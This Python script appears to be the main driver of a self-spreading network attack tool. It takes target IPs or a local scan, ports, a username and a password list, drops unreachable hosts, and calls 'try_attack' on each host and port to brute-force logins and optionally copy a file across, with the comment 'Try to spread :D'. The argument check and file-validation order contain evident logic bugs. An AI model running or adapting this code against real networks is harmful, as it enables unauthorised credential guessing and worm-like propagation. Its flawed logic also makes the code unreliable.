#!/usr/bin/python3

import sys

from src import net_propagation

"""
 - Importing sys to make OS calls and use OS level utilities.
"""

"""
===PLEASE READ===
This main function itself has more  specific, low level commenting.
"""


def main():
    """
    This main function controls all the things.
    """
    # These arguments are passed in by the end user.
    args = sys.argv
    # Blank target ports until we assign them later, they're here purely for
    # scope related reasons.
    target_ports = []
    # Same here....
    target_username = ""
    # And here...
    passwords_filename = ""
    # Here...
    transfer_file_filename = ""
    # *yawn*
    ip_list = []
    # Right, done...
    password_list = []

    # The following if statement only runs if the user uses the script
    # correctly, or they don't ask for help.
    if (("-t" or "-L" in args) and "-p" and "-u" and "-f" in args
            and len(args) >= 8 and "-h" and "--help" not in args):
        try:
            # Here I'm fetching the values needed for the blank variables
            # above.
            values = net_propagation.assigning_values(args)
            # Then assigning these values to their associated variables which
            # are most of the blank ones above.
            ip_list = values[0]
            target_ports = values[1]
            target_username = values[2]
            passwords_filename = values[3]

        except RuntimeError:
            # Some silliness happened when it came to fetching / assigning
            # values, mostly triggered by null entries.
            print("!!!ERROR: FAILED ASSIGNING VALUES (MAYBE NULL)!!!")
            # Teach the user how to use this spaghetti code.
            net_propagation.gtfo_and_rtfm()
    else:
        # Probably a typo, either way showing the help again.
        print("!!!ERROR: PARAMETER MISUSE, CHECK HELP TEXT BELOW!!!")
        net_propagation.gtfo_and_rtfm()

    # The end user specified a local scan must be executed, the result of the
    # local scan will extend the current ip_list.
    if "-L" in args:
        print("Performing local scan, this might take a while so grab a"
              + " coffee...")
        ip_list.extend(net_propagation.gathering_local_ips(ip_list))

    try:
        # Here I made sure the user actually gave a valid file for the
        # passwords list. If they have...
        net_propagation.validate_file_exists(passwords_filename)
        # A list of passwords is created.
        password_list = \
            net_propagation.convert_file_to_list(passwords_filename)
    except RuntimeError:
        # Uh oh, file doesn't exist, alert the user and exit gracefully, so
        # they can either fix their mistake or repent their sins.
        net_propagation.file_error_handler(passwords_filename)

    # If the user wants to transfer a file, this stuff should be done...
    if "-d" in args:
        try:
            # Again making sure the transfer file actually exits, just like
            # the password file above.
            net_propagation.validate_file_exists(transfer_file_filename)
            # if it does though we assign the filename to the name out of scope
            # above.
            transfer_file_filename = args[args.index("-d") + 1]
        except RuntimeError:
            # File doesn't exist, throw an error and give the usual slap across
            # the wrist.
            net_propagation.file_error_handler(transfer_file_filename)
    # Removing duplicate entries in the IP address list, can come from
    # combining local scan with given IP addresses in an ip address file among
    # other things and silliness.
    ip_list = list(dict.fromkeys(ip_list))
    # Removing IPs from the IP list that can't be pinged from the host machine
    # of the script.
    ip_list = net_propagation.remove_unreachable_ips(ip_list)
    # Getting a list of ports by splitting the target ports specified by the
    # user on the comma.
    ports = target_ports.split(",")
    # Cycling through every IP in the IP list...
    for ip in ip_list:
        # And then using all user specified ports against that specific IP...
        for port in ports:
            # Try to spread :D
            # TODO: Change method names and reread some comments like here
            # for example, not attacking, propagating and protecting more like.
            net_propagation.try_attack(ip, port, target_username,
                                       password_list, transfer_file_filename,
                                       args)


main()
